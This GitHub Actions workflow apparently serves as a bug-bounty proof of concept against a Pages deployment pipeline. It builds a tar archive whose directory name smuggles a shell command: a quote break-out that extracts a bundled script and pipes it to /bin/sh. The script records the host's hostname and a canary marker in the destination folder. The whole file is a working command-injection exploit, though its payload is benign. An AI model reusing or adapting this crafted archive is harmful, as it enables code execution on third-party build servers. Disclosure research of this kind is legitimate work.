name: Pages bounded source destination canary

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Create source-destination canary tar
        run: |
          python3 - <<'PY'
          import io
          import tarfile

          directory = 'x\';f(){ /bin/tar -xOf "$4" s|/bin/sh -s -- "$3" "$5";};f \''
          script = r'''#!/bin/sh
          version=$1
          dest=$2
          {
            echo CANARY=BB_CT_A_PATH_V1
            echo OWNER=singetu0096
            printf 'HOSTNAME='; /bin/hostname
            printf 'DEST=%s\n' "$dest"
          } > "$dest/a-path-result-cd159c7d3bd0ee6129248259.txt"
          printf '%s\n' "$dest" > "$dest/a-dest-cd159c7d3bd0ee6129248259.txt"
          printf '%s\n' "$version" > "$dest/pages-build-version"
          '''

          assert len(directory.encode()) == 58
          assert len(script.encode()) <= 1024
          directory_header = tarfile.TarInfo(directory)
          directory_header.type = tarfile.DIRTYPE
          directory_header.mode = 0o755
          script_header = tarfile.TarInfo('s')
          script_header.mode = 0o600
          script_header.size = len(script.encode())
          with tarfile.open('pages-source-destination-canary.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
              archive.addfile(directory_header)
              archive.addfile(script_header, io.BytesIO(script.encode()))
          PY

      - name: Upload without ZIP wrapping
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          path: pages-source-destination-canary.tar
          archive: false
          retention-days: 1
